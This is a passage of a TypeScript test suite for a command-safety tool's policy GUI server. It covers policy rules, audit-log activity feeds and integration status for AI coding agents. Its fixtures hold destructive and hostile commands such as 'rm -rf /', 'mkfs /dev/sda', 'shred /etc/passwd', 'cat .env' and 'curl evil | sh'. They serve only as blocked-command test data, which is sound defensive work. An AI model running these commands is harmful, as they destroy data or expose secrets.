        errors: [expect.stringContaining('must be "on" or "off"')],
      });

      const allowed = await postJson<{ result: string; ruleId?: string }>(
        `${server.origin}/api/policy/explain?token=${server.token}`,
        server.token,
        {
          command: TOGGLE_COMMAND,
          policy: {
            ...DEFAULT_POLICY_BODY,
            destructive_command_protection: {
              enabled: true,
              overrides: { [TOGGLE_RULE_ID]: 'off' },
            },
          },
        },
      );
      expect(allowed.result).toBe('allowed');

      const blocked = await postJson<{ result: string; ruleId?: string }>(
        `${server.origin}/api/policy/explain?token=${server.token}`,
        server.token,
        {
          command: TOGGLE_COMMAND,
          policy: {
            ...DEFAULT_POLICY_BODY,
            destructive_command_protection: {
              enabled: true,
              overrides: { [TOGGLE_RULE_ID]: 'on' },
            },
          },
        },
      );
      expect(blocked.result).toBe('blocked');
      expect(blocked.ruleId).toBe(TOGGLE_RULE_ID);

      // Reads a sensitive path; analyzer input only and is never executed.
      const READ_ENV_COMMAND = 'cat .env';
      const secretBlocked = await postJson<{ result: string; ruleId?: string; reason?: string }>(
        `${server.origin}/api/policy/explain?token=${server.token}`,
        server.token,
        { command: READ_ENV_COMMAND, policy: DEFAULT_POLICY_BODY },
      );
      expect(secretBlocked.result).toBe('blocked');
      expect(secretBlocked.ruleId).toBe('secret.basename.env');
      expect(secretBlocked.reason).toEqual(expect.any(String));
      expect(secretBlocked.reason?.length).toBeGreaterThan(0);

      const secretDisabled = await postJson<{ result: string; ruleId?: string }>(
        `${server.origin}/api/policy/explain?token=${server.token}`,
        server.token,
        {
          command: READ_ENV_COMMAND,
          policy: {
            ...DEFAULT_POLICY_BODY,
            secret_protection: { enabled: false, overrides: {}, deny_paths: [] },
          },
        },
      );
      expect(secretDisabled.result).toBe('allowed');

      // Matches the draft deny path; analyzer input only and is never executed.
      const READ_NOTES_COMMAND = 'cat notes.txt';
      const denyPathBlocked = await postJson<{ result: string; ruleId?: string }>(
        `${server.origin}/api/policy/explain?token=${server.token}`,
        server.token,
        {
          command: READ_NOTES_COMMAND,
          policy: {
            ...DEFAULT_POLICY_BODY,
            secret_protection: { enabled: true, overrides: {}, deny_paths: ['notes.txt'] },
          },
        },
      );
      expect(denyPathBlocked.result).toBe('blocked');
      expect(denyPathBlocked.ruleId).toBe('secret.deny-path');

      expect(existsSync(join(safetyNetHome, 'policy.json'))).toBe(false);
    } finally {
      await server.close();
    }
  });

  test('POST api policy explain matches custom rules loaded from disk', async () => {
    const projectDir = mkdtempSync(join(tmpdir(), 'safety-net-gui-rulebook-'));
    try {
      await syncInitialGitRulebook(projectDir);
      const server = await createPolicyGuiServer({
        cwd: projectDir,
        userConfigDir: join(projectDir, 'home', '.cc-safety-net', 'rules'),
      });
      try {
        const blocked = await postJson<{ result: string; customRule?: { id: string } }>(
          `${server.origin}/api/policy/explain?token=${server.token}`,
          server.token,
          { command: 'git add -A', policy: DEFAULT_POLICY_BODY },
        );
        expect(blocked.result).toBe('blocked');
        expect(blocked.customRule?.id).toBe('project-rules/block-git-add-all');
      } finally {
        await server.close();
      }
    } finally {
      rmSync(projectDir, { recursive: true, force: true });
    }
  });

  test('POST api policy writes canonical JSON and reset writes defaults', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const save = await postJson<WriteApiResponse>(
        `${server.origin}/api/policy?token=${server.token}`,
        server.token,
        {
          version: 1,
          safety: { level: 'standard', overrides: { paranoid_rm: true } },
          workflow: { worktree_mode: false },
          destructive_command_protection: {
            enabled: false,
            overrides: { 'git.reset-hard': 'off' },
          },
          secret_protection: {
            enabled: true,
            overrides: { 'secret.ext.pem': 'off' },
            deny_paths: [],
          },
        },
      );

      expect(save.errors).toEqual([]);
      expect(readFileSync(join(safetyNetHome, 'policy.json'), 'utf-8')).toContain(
        '"git.reset-hard": "off"',
      );

      const reset = await postJson<WriteApiResponse>(
        `${server.origin}/api/reset?token=${server.token}`,
        server.token,
        {},
      );
      expect(reset.errors).toEqual([]);
      const resetPolicy = JSON.parse(readFileSync(join(safetyNetHome, 'policy.json'), 'utf-8')) as {
        version: number;
        destructive_command_protection: { enabled: boolean; overrides: Record<string, string> };
        secret_protection: { enabled: boolean; overrides: Record<string, string> };
      };
      expect(resetPolicy).toMatchObject({
        version: 1,
        destructive_command_protection: { enabled: true, overrides: {} },
        secret_protection: { enabled: true, overrides: {} },
      });
    } finally {
      await server.close();
    }
  });

  test('invalid POST is rejected and leaves existing file unchanged', async () => {
    mkdirSync(safetyNetHome, { recursive: true });
    writeFileSync(join(safetyNetHome, 'policy.json'), '{"version":1}\n', 'utf-8');
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const response = await fetch(`${server.origin}/api/policy?token=${server.token}`, {
        method: 'POST',
        headers: {
          'content-type': 'application/json',
          'x-cc-safety-net-token': server.token,
        },
        body: JSON.stringify({ version: 1, extra: true }),
      });

      expect(response.status).toBe(400);
      const body = (await response.json()) as { errors: string[] };
      expect(body.errors).toContain('unknown field "extra"');
      expect(readFileSync(join(safetyNetHome, 'policy.json'), 'utf-8')).toBe('{"version":1}\n');
    } finally {
      await server.close();
    }
  });

  test('malformed POST JSON and unknown routes return errors', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const malformed = await fetch(`${server.origin}/api/policy?token=${server.token}`, {
        method: 'POST',
        headers: {
          'content-type': 'application/json',
          'x-cc-safety-net-token': server.token,
        },
        body: '{bad json',
      });
      expect(malformed.status).toBe(400);
      const malformedBody = (await malformed.json()) as { errors: string[] };
      expect(malformedBody.errors[0]).toContain('Invalid JSON');

      const missing = await fetch(`${server.origin}/missing?token=${server.token}`);
      expect(missing.status).toBe(404);
      expect((await missing.json()) as { error: string }).toEqual({ error: 'Not found' });
    } finally {
      await server.close();
    }
  });

  test('POST api repair preserves valid settings from parseable invalid policy', async () => {
    mkdirSync(safetyNetHome, { recursive: true });
    writeFileSync(
      join(safetyNetHome, 'policy.json'),
      JSON.stringify({
        version: 2,
        modes: { strict: true, paranoid: 'yes' },
        safety: { level: 'strict', overrides: { fail_closed: true } },
        workflow: { worktree_mode: true },
        destructive_command_protection: {
          enabled: false,
          overrides: { 'git.reset-hard': 'off', 'git.unknown': 'off' },
        },
        secret_protection: {
          enabled: 'no',
          overrides: { 'secret.ext.pem': 'off' },
          deny_paths: ['private/token.txt', 42],
        },
      }),
      'utf-8',
    );
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const repairedPolicy = await repairPolicyViaApi(safetyNetHome, server);

      expect(repairedPolicy).toMatchObject({
        version: 1,
        safety: { level: 'strict', overrides: { fail_closed: true } },
        workflow: { worktree_mode: true },
        destructive_command_protection: {
          enabled: false,
          overrides: { 'git.reset-hard': 'off' },
        },
        secret_protection: {
          enabled: true,
          overrides: { 'secret.ext.pem': 'off' },
          deny_paths: ['private/token.txt'],
        },
      });
    } finally {
      await server.close();
    }
  });

  test('POST api repair restores defaults for malformed policy JSON', async () => {
    mkdirSync(safetyNetHome, { recursive: true });
    writeFileSync(join(safetyNetHome, 'policy.json'), '{bad json', 'utf-8');
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const repairedPolicy = await repairPolicyViaApi(safetyNetHome, server);

      expect(repairedPolicy).toMatchObject({
        version: 1,
        destructive_command_protection: { enabled: true, overrides: {} },
        secret_protection: { enabled: true, overrides: {}, deny_paths: [] },
      });
    } finally {
      await server.close();
    }
  });

  test('POST requires the header token as well as the URL token', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      const response = await fetch(`${server.origin}/api/reset?token=${server.token}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: '{}',
      });

      expect(response.status).toBe(403);
      expect(existsSync(join(safetyNetHome, 'policy.json'))).toBe(false);
    } finally {
      await server.close();
    }
  });

  test('POST api star requires the header token as well as the URL token', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      expect((await fetch(`${server.origin}/api/star`)).status).toBe(403);
      expect((await fetch(`${server.origin}/api/star?token=wrong`)).status).toBe(403);
      expect(
        (
          await fetch(`${server.origin}/api/star?token=${server.token}`, {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: '{}',
          })
        ).status,
      ).toBe(403);
    } finally {
      await server.close();
    }
  });

  test('POST api star returns success from injected star action', async () => {
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      starRepo: async () => ({ ok: true }),
    });
    try {
      expect(
        await postJson<{ ok: boolean }>(
          `${server.origin}/api/star?token=${server.token}`,
          server.token,
          {},
        ),
      ).toEqual({ ok: true });
    } finally {
      await server.close();
    }
  });

  test('POST api star returns fallback URL when injected star action fails', async () => {
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      starRepo: async () => ({ ok: false }),
    });
    try {
      expect(
        await postJson<{ fallbackUrl: string; ok: boolean }>(
          `${server.origin}/api/star?token=${server.token}`,
          server.token,
          {},
        ),
      ).toEqual({
        ok: false,
        fallbackUrl: 'https://github.com/kenryu42/cc-safety-net',
      });
    } finally {
      await server.close();
    }
  });

  test('GET api star context requires URL token and returns injected context', async () => {
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      fetchStarContext: async () => ({ starred: false, starCount: 1234, blockedTotal: 14 }),
    });
    try {
      expect((await fetch(`${server.origin}/api/star/context`)).status).toBe(403);
      expect((await fetch(`${server.origin}/api/star/context?token=wrong`)).status).toBe(403);
      expect(
        await getJson<StarContextApiResponse>(
          `${server.origin}/api/star/context?token=${server.token}`,
        ),
      ).toEqual({ starred: false, starCount: 1234, blockedTotal: 14 });
    } finally {
      await server.close();
    }
  });

  test('star context reads all-time blocked activity and degrades failed fields independently', async () => {
    const logsDir = join(safetyNetHome, 'logs');
    mkdirSync(logsDir, { recursive: true });
    writeFileSync(
      join(logsDir, 'session.jsonl'),
      [
        JSON.stringify({
          ts: new Date().toISOString(),
          decision: 'block',
          command: 'rm -rf .',
          reason: 'destructive',
        }),
        JSON.stringify({
          ts: new Date().toISOString(),
          decision: 'allow',
          command: 'git status',
          reason: 'safe',
        }),
        JSON.stringify({
          ts: new Date(Date.now() - 8 * 24 * 60 * 60 * 1000).toISOString(),
          decision: 'block',
          command: 'git reset --hard',
          reason: 'destructive',
        }),
      ].join('\n'),
      'utf-8',
    );

    expect(
      await fetchStarContext({
        command: join(tempDir, 'missing-gh'),
        logsDir,
        fetchRepo: async () => {
          throw new Error('offline');
        },
      }),
    ).toEqual({ starred: null, starCount: null, blockedTotal: 2 });
  });

  test('GET /api/activity rejects missing token, wrong token, and invalid days', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      expect((await fetch(`${server.origin}/api/activity`)).status).toBe(403);
      expect((await fetch(`${server.origin}/api/activity?token=wrong`)).status).toBe(403);
      const bad = await fetch(`${server.origin}/api/activity?days=abc&token=${server.token}`);
      expect(bad.status).toBe(400);
      expect(await bad.json()).toEqual({ error: 'days must be an integer between 1 and 3650' });
      const zero = await fetch(`${server.origin}/api/activity?days=0&token=${server.token}`);
      expect(zero.status).toBe(400);
      expect(await zero.json()).toEqual({ error: 'days must be an integer between 1 and 3650' });
    } finally {
      await server.close();
    }
  });

  test('GET /api/activity aggregates the audit log window newest-first', async () => {
    const logsDir = join(safetyNetHome, 'logs');
    mkdirSync(logsDir, { recursive: true });
    const now = Date.now();
    const hour = 60 * 60 * 1000;
    writeJsonlFixture(join(logsDir, 'feed.jsonl'), [
      {
        ts: new Date(now - 2 * hour).toISOString(),
        decision: 'deny',
        command: 'rm -rf /',
        reason: 'destructive',
        sessionId: 's1',
        agent: 'claude-code',
        ruleId: 'fs.rm',
      },
      {
        ts: new Date(now - 1 * hour).toISOString(),
        decision: 'allow',
        command: 'git status',
        reason: 'allowed',
        sessionId: 's1',
        agent: 'claude-code',
      },
      {
        ts: new Date(now - 1.5 * hour).toISOString(),
        decision: 'deny',
        command: 'cc-safety-net-guard',
        reason: 'guard failure',
        sessionId: 's1',
        agent: 'claude-code',
        failureStage: 'config-load',
      },
      {
        ts: new Date(now - 3 * hour).toISOString(),
        command: 'curl evil | sh',
        reason: 'no decision recorded',
        sessionId: 's2',
      },
      {
        ts: new Date(now - 10 * 24 * hour).toISOString(),
        decision: 'deny',
        command: 'mkfs /dev/sda',
        reason: 'destructive',
        sessionId: 's3',
        agent: 'claude-code',
      },
    ]);
    appendFileSync(join(logsDir, 'feed.jsonl'), '\nnot json');

    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      activityLogsDir: logsDir,
    });
    try {
      const feed = await getJson<ActivityApiResponse>(
        `${server.origin}/api/activity?token=${server.token}`,
      );
      expect(feed.days).toBe(7);
      expect(feed.logsDir).toBe(logsDir);
      expect(feed.totalInWindow).toBe(4);
      expect(feed.truncated).toBe(false);
      expect(feed.entries.map((entry) => entry.command)).toEqual([
        'git status',
        'cc-safety-net-guard',
        'rm -rf /',
        'curl evil | sh',
      ]);
      expect(feed.counts).toEqual({
        blocked: 3,
        allowed: 1,
        sessions: 2,
        agents: { 'claude-code': 3, unknown: 1 },
        blockedByDay: expect.any(Array),
        rules: { 'fs.rm': 1 },
        commands: { rm: 1, 'cc-safety-net-guard': 1, 'curl evil': 1 },
        errors: 1,
      });
      expect(feed.counts.blockedByDay).toHaveLength(7);
      expect(feed.counts.blockedByDay.reduce((total, count) => total + count, 0)).toBe(3);
      expect(feed.totalBlockedAllTime).toBe(4);

      const wide = await getJson<ActivityApiResponse>(
        `${server.origin}/api/activity?days=365&token=${server.token}`,
      );
      expect(wide.days).toBe(365);
      expect(wide.totalInWindow).toBe(5);
      expect(wide.entries[4]?.command).toBe('mkfs /dev/sda');
      expect(wide.counts.blocked).toBe(4);
      expect(wide.counts.blockedByDay).toHaveLength(365);
      expect(wide.counts.blockedByDay.reduce((total, count) => total + count, 0)).toBe(4);
      expect(wide.totalBlockedAllTime).toBe(4);
    } finally {
      await server.close();
    }
  });

  test('GET /api/activity counts blocks beyond the 500-entry cap', async () => {
    const logsDir = join(safetyNetHome, 'logs');
    mkdirSync(logsDir, { recursive: true });
    const now = Date.now();
    const minute = 60 * 1000;
    writeJsonlFixture(join(logsDir, 'feed.jsonl'), [
      {
        ts: new Date(now - 501 * minute).toISOString(),
        decision: 'deny',
        command: 'rm -rf /',
        reason: 'destructive',
      },
      ...Array.from({ length: 501 }, (_, index) => ({
        ts: new Date(now - index * minute).toISOString(),
        decision: 'allow',
        command: `git status ${index}`,
        reason: 'allowed',
      })),
    ]);

    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      activityLogsDir: logsDir,
    });
    try {
      const feed = await getJson<ActivityApiResponse>(
        `${server.origin}/api/activity?token=${server.token}`,
      );
      expect(feed.truncated).toBe(true);
      expect(feed.totalInWindow).toBe(502);
      expect(feed.entries).toHaveLength(500);
      // The deny falls outside the capped entry list but must still be counted.
      expect(feed.counts.blocked).toBe(1);
      expect(feed.counts.commands).toEqual({ rm: 1 });
      expect(feed.counts.blockedByDay.reduce((total, count) => total + count, 0)).toBe(1);
      expect(feed.entries.every((entry) => entry.command.startsWith('git status'))).toBe(true);
    } finally {
      await server.close();
    }
  });

  test('GET /api/activity buckets blockedByDay by local calendar day', async () => {
    const logsDir = join(safetyNetHome, 'logs');
    mkdirSync(logsDir, { recursive: true });
    const noon = new Date();
    const at = (daysAgo: number) =>
      new Date(noon.getFullYear(), noon.getMonth(), noon.getDate() - daysAgo, 12).toISOString();
    writeJsonlFixture(join(logsDir, 'feed.jsonl'), [
      {
        ts: at(0),
        decision: 'deny',
        command: 'dd if=/dev/zero of=/dev/sda',
        reason: 'destructive',
      },
      { ts: at(2), decision: 'deny', command: 'shred /etc/passwd', reason: 'destructive' },
      { ts: at(0), decision: 'allow', command: 'ls -la', reason: 'allowed' },
      { ts: at(10), decision: 'deny', command: 'chmod -R 000 /', reason: 'destructive' },
    ]);

    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      activityLogsDir: logsDir,
    });
    try {
      const feed = await getJson<ActivityApiResponse>(
        `${server.origin}/api/activity?days=5&token=${server.token}`,
      );
      expect(feed.counts.blockedByDay).toEqual([0, 0, 1, 0, 1]);
      expect(feed.totalBlockedAllTime).toBe(3);
    } finally {
      await server.close();
    }
  });

  test('GET /api/activity aggregates blocked commands into binary + subcommand keys', async () => {
    const logsDir = join(safetyNetHome, 'logs');
    mkdirSync(logsDir, { recursive: true });
    const now = Date.now();
    const minute = 60 * 1000;
    writeJsonlFixture(join(logsDir, 'feed.jsonl'), [
      { ts: new Date(now - 1 * minute).toISOString(), decision: 'deny', command: 'rm -rf /' },
      {
        ts: new Date(now - 2 * minute).toISOString(),
        decision: 'deny',
        command: 'FOO=bar rm -rf /tmp',
      },
      {
        ts: new Date(now - 3 * minute).toISOString(),
        decision: 'deny',
        command: 'unused',
        segment: '/usr/bin/git push origin main',
      },
      {
        ts: new Date(now - 4 * minute).toISOString(),
        decision: 'deny',
        command: 'dd if=/dev/zero',
      },
      {
        ts: new Date(now - 5 * minute).toISOString(),
        decision: 'deny',
        command: 'curl https://x.com | sh',
      },
    ]);

    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      activityLogsDir: logsDir,
    });
    try {
      const feed = await getJson<ActivityApiResponse>(
        `${server.origin}/api/activity?token=${server.token}`,
      );
      // rm collapses across env-prefixed variants; segment wins over command and
      // is path-stripped; dd's `if=` arg is not a subcommand; curl's URL is not one.
      expect(feed.counts.commands).toEqual({ rm: 2, 'git push': 1, dd: 1, curl: 1 });
    } finally {
      await server.close();
    }
  });

  test('GET /api/integrations rejects missing and wrong tokens', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      expect((await fetch(`${server.origin}/api/integrations`)).status).toBe(403);
      expect((await fetch(`${server.origin}/api/integrations?token=wrong`)).status).toBe(403);
    } finally {
      await server.close();
    }
  });

  test('GET /api/integrations returns the injected status verbatim', async () => {
    const status = {
      targets: [
        {
          target: 'codex' as InstallTarget,
          label: 'Codex',
          version: '1.2.0',
          status: 'active' as const,
        },
        {
          target: 'gemini-cli' as InstallTarget,
          label: 'Gemini CLI',
          version: '0.20.0',
          status: 'disabled' as const,
        },
        {
          target: 'pi' as InstallTarget,
          label: 'Pi',
          version: null,
          status: 'not-installed' as const,
        },
      ],
      system: { version: '1.0.0', nodeVersion: 'v22.0.0', platform: 'darwin arm64' },
    };
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      fetchIntegrations: async () => status,
    });
    try {
      expect(
        await getJson<IntegrationsApiResponse>(
          `${server.origin}/api/integrations?token=${server.token}`,
        ),
      ).toEqual(status);
    } finally {
      await server.close();
    }
  });

  test('POST /api/install requires the header token as well as the URL token', async () => {
    let ran = false;
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      runIntegration: async () => {
        ran = true;
        return { ok: true, output: '' };
      },
    });
    try {
      const response = await fetch(`${server.origin}/api/install?token=${server.token}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ target: 'codex' }),
      });
      expect(response.status).toBe(403);
      expect(ran).toBe(false);
    } finally {
      await server.close();
    }
  });

  test('POST /api/install rejects unknown targets and malformed JSON', async () => {
    let ran = false;
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      runIntegration: async () => {
        ran = true;
        return { ok: true, output: '' };
      },
    });
    try {
      const unknown = await fetch(`${server.origin}/api/install?token=${server.token}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'x-cc-safety-net-token': server.token },
        body: JSON.stringify({ target: 'not-a-real-agent' }),
      });
      expect(unknown.status).toBe(400);
      expect(await unknown.json()).toEqual({ error: 'unknown target' });

      const malformed = await fetch(`${server.origin}/api/install?token=${server.token}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'x-cc-safety-net-token': server.token },
        body: '{bad json',
      });
      expect(malformed.status).toBe(400);
      expect(((await malformed.json()) as { errors: string[] }).errors[0]).toContain(
        'Invalid JSON',
      );
      expect(ran).toBe(false);
    } finally {
      await server.close();
    }
  });

  test('POST /api/install runs the codex target and returns its post-install message', async () => {
    const calls: [InstallAction, InstallTarget][] = [];
    const output =
      'Installed Codex integration\nStart Codex, open /hooks, select the cc-safety-net PreToolUse hook, and press t to trust it.';
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      runIntegration: async (action, target) => {
        calls.push([action, target]);
        return { ok: true, output };
      },
    });
    try {
      const result = await postJson<IntegrationActionApiResponse>(
        `${server.origin}/api/install?token=${server.token}`,
        server.token,
        { target: 'codex' },
      );
      expect(calls).toEqual([['install', 'codex']]);
      expect(result).toEqual({ ok: true, output });
    } finally {
      await server.close();
    }
  });

  test('POST /api/uninstall maps to the uninstall action and returns the failure output', async () => {
    const calls: [InstallAction, InstallTarget][] = [];
    const output =
      'Failed to run claude plugin uninstall cc-safety-net (exit 1).\ndistinctive-stderr-text';
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      runIntegration: async (action, target) => {
        calls.push([action, target]);
        return { ok: false, output };
      },
    });
    try {
      const result = await postJson<IntegrationActionApiResponse>(
        `${server.origin}/api/uninstall?token=${server.token}`,
        server.token,
        { target: 'claude-code' },
      );
      expect(calls).toEqual([['uninstall', 'claude-code']]);
      expect(result).toEqual({ ok: false, output });
    } finally {
      await server.close();
    }
  });

  test('fetchIntegrations maps CLI versions and hook status without spawning', async () => {
    const homeDir = join(tempDir, 'home');
    mkdirSync(join(homeDir, '.kimi-code'), { recursive: true });
    writeFileSync(
      join(homeDir, '.kimi-code', 'config.toml'),
      'command = "cc-safety-net hook --kimi-code"\n',
      'utf-8',
    );

    const originalKimiHome = process.env.KIMI_CODE_HOME;
    delete process.env.KIMI_CODE_HOME;
    try {
      const status = await fetchIntegrations({ fetcher: mockVersionFetcher, homeDir });

      expect(status.targets.map((target) => target.target)).toEqual([
        'antigravity-cli',
        'claude-code',
        'codex',
        'gemini-cli',
        'copilot-cli',
        'kimi-code',
        'opencode',
        'pi',
      ]);
      const versions = Object.fromEntries(
        status.targets.map((target) => [target.target, target.version]),
      );
      expect(versions).toEqual({
        'antigravity-cli': '2.0.0',
        'claude-code': '1.0.0',
        codex: '1.2.0',
        'gemini-cli': '0.20.0',
        'copilot-cli': '1.0.9',
        'kimi-code': '0.3.0',
        opencode: '0.1.0',
        pi: '0.4.0',
      });
      const statuses = Object.fromEntries(
        status.targets.map((target) => [target.target, target.status]),
      );
      expect(statuses['kimi-code']).toBe('active');
      expect(statuses.opencode).toBe('not-installed');
      expect(statuses.pi).toBe('not-installed');
      // The system block carries only version/node/platform — npm and bun are excluded.
      expect(Object.keys(status.system).sort()).toEqual(['nodeVersion', 'platform', 'version']);
    } finally {
      if (originalKimiHome === undefined) delete process.env.KIMI_CODE_HOME;
      else process.env.KIMI_CODE_HOME = originalKimiHome;
    }
  });

  test('fetchIntegrations maps a detected-but-disabled hook to disabled', async () => {
    const status = await fetchIntegrations({
      fetcher: async (args) => {
        if (args[0] === 'claude' && args[1] === 'plugin') {
          return `Installed plugins:

  ❯ cc-safety-net@cc-marketplace
    Version: 0.8.2
    Scope: user
    Status: ✘ disabled`;
        }
        return mockVersionFetcher(args);
      },
    });

    const statuses = Object.fromEntries(
      status.targets.map((target) => [target.target, target.status]),
    );
    expect(statuses['claude-code']).toBe('disabled');
  });

  test('GET /api/health rejects missing and wrong tokens', async () => {
    const server = await createPolicyGuiServer({ userConfigDir: join(safetyNetHome, 'rules') });
    try {
      expect((await fetch(`${server.origin}/api/health`)).status).toBe(403);
      expect((await fetch(`${server.origin}/api/health?token=wrong`)).status).toBe(403);
    } finally {
      await server.close();
    }
  });

  test('GET /api/health returns the injected status verbatim', async () => {
    const status = {
      hooks: [
        { platform: 'claude-code', label: 'Claude Code', configured: true },
        { platform: 'codex', label: 'Codex', configured: false },
      ],
      update: { currentVersion: '1.0.0', latestVersion: '2.0.0', updateAvailable: true },
    };
    const server = await createPolicyGuiServer({
      userConfigDir: join(safetyNetHome, 'rules'),
      fetchHealth: async () => status,
    });
    try {
      expect(
        await getJson<typeof status>(`${server.origin}/api/health?token=${server.token}`),
      ).toEqual(status);
    } finally {
      await server.close();
    }
  });

  test('fetchHealth runs the full probe and reports all detected hooks without spawning', async () => {
    const status = await fetchHealth({
      fetcher: mockVersionFetcher,
      homeDir: join(tempDir, 'home'),
      checkUpdates: async () => ({
        currentVersion: '1.0.0',
        latestVersion: '2.0.0',
        updateAvailable: true,
      }),
    });

    const platforms = status.hooks.map((hook) => hook.platform);
    expect(platforms).toContain('claude-code');
    expect(platforms).toContain('codex');
    // Full-probe wiring: the Gemini extensions list reaches hook detection.
    expect(platforms).toContain('gemini-cli');
    // The Pi probe is skipped when a fetcher is injected, so no process spawns in tests.
    expect(platforms).not.toContain('pi');
    const configured = Object.fromEntries(
      status.hooks.map((hook) => [hook.platform, hook.configured]),
    );
    expect(configured['claude-code']).toBe(true);
    expect(configured.codex).toBe(true);
    expect(configured['gemini-cli']).toBe(true);
    expect(status.hooks.find((hook) => hook.platform === 'claude-code')?.label).toBe('Claude Code');
    expect(status.update).toEqual({
      currentVersion: '1.0.0',
      latestVersion: '2.0.0',
      updateAvailable: true,
    });
  });

  test('runIntegration captures console output and restores the console afterward', async () => {
    const originalLog = console.log;
    const result = await runIntegration('install', 'codex', {
      probeTargets: () => false,
      detectConfiguredTargets: async () => [],
      selectTargets: async () => {
        console.log('marker-line');
        return [];
      },
    });

    expect(result.ok).toBe(true);
    expect(result.output).toContain('marker-line');
    expect(console.log).toBe(originalLog);
  });

  test('runIntegration reports failures with the captured error output', async () => {
    const result = await runIntegration('install', 'codex', {
      probeTargets: () => false,
      detectConfiguredTargets: async () => [],
      selectTargets: async () => {
        throw new Error('distinct-failure-text');
      },
    });

    expect(result.ok).toBe(false);
    expect(result.output).toContain('distinct-failure-text');
  });

  test('runIntegration serializes concurrent runs so captured output never mixes', async () => {
    const first = runIntegration('install', 'codex', {
      probeTargets: () => false,
      detectConfiguredTargets: async () => [],
      selectTargets: async () => {
        await new Promise((resolve) => setTimeout(resolve, 50));
        console.log('first-marker');
        return [];
      },
    });
    const second = runIntegration('install', 'codex', {
      probeTargets: () => false,
      detectConfiguredTargets: async () => [],
      selectTargets: async () => {
        console.log('second-marker');
        return [];
      },
    });

    const [firstResult, secondResult] = await Promise.all([first, second]);
    expect(firstResult.output).toContain('first-marker');
    expect(firstResult.output).not.toContain('second-marker');
    expect(secondResult.output).toContain('second-marker');
    expect(secondResult.output).not.toContain('first-marker');
  });

  test('userHasStarredRepo checks gh auth before starred state and maps exits', async () => {
    const localTempDir = mkdtempSync(join(process.cwd(), '.tmp-star-check-'));
    const binDir = join(localTempDir, 'bin');
    const ghPath = join(binDir, 'gh');
    const starLog = join(localTempDir, 'star-check-argv.txt');
    mkdirSync(binDir);
    writeFileSync(
      ghPath,
      [
        '#!/bin/sh',
        'printf "%s\\n" "$@" >> "$STAR_LOG"',
        'if [ "$1" = "auth" ] && [ "$2" = "status" ]; then exit "$AUTH_EXIT"; fi',
        'exit "$STAR_EXIT"',
        '',
      ].join('\n'),
      'utf-8',
    );
    chmodSync(ghPath, 0o755);

    const originalStarLog = process.env.STAR_LOG;
    const originalAuthExit = process.env.AUTH_EXIT;
    const originalStarExit = process.env.STAR_EXIT;
    process.env.STAR_LOG = starLog;
    try {
      process.env.AUTH_EXIT = '0';
      process.env.STAR_EXIT = '0';
      expect(await userHasStarredRepo(ghPath)).toBe(true);
      expect(readFileSync(starLog, 'utf-8')).toBe(
        'auth\nstatus\napi\n/user/starred/kenryu42/cc-safety-net\n',
      );

      writeFileSync(starLog, '', 'utf-8');
      process.env.STAR_EXIT = '1';
      expect(await userHasStarredRepo(ghPath)).toBe(false);
      expect(readFileSync(starLog, 'utf-8')).toBe(
        'auth\nstatus\napi\n/user/starred/kenryu42/cc-safety-net\n',
      );

      writeFileSync(starLog, '', 'utf-8');
      process.env.AUTH_EXIT = '1';
      process.env.STAR_EXIT = '0';
      expect(await userHasStarredRepo(ghPath)).toBeNull();
      expect(readFileSync(starLog, 'utf-8')).toBe('auth\nstatus\n');

      expect(await userHasStarredRepo(join(localTempDir, 'missing-gh'))).toBeNull();
    } finally {
      restoreEnv('STAR_LOG', originalStarLog);
      restoreEnv('AUTH_EXIT', originalAuthExit);
      restoreEnv('STAR_EXIT', originalStarExit);
      rmSync(localTempDir, { recursive: true, force: true });
    }
  });

  test('star helpers return fallback states on timeout', async () => {
    const localTempDir = mkdtempSync(join(process.cwd(), '.tmp-star-timeout-'));
    const ghPath = join(localTempDir, 'gh');
    writeFileSync(ghPath, '#!/bin/sh\n/bin/sleep 1\n', 'utf-8');
    chmodSync(ghPath, 0o755);

    try {
      expect(await starRepo(ghPath, 10)).toEqual({ ok: false });
      expect(await userHasStarredRepo(ghPath, 10)).toBeNull();
    } finally {
      rmSync(localTempDir, { recursive: true, force: true });
    }
  });

  test('starRepo uses gh CLI with fixed argv', async () => {
    const localTempDir = mkdtempSync(join(process.cwd(), '.tmp-star-'));
    const binDir = join(localTempDir, 'bin');
    const ghPath = join(binDir, 'gh');
    const starLog = join(localTempDir, 'star-argv.txt');
    mkdirSync(binDir);
    writeFileSync(
      ghPath,
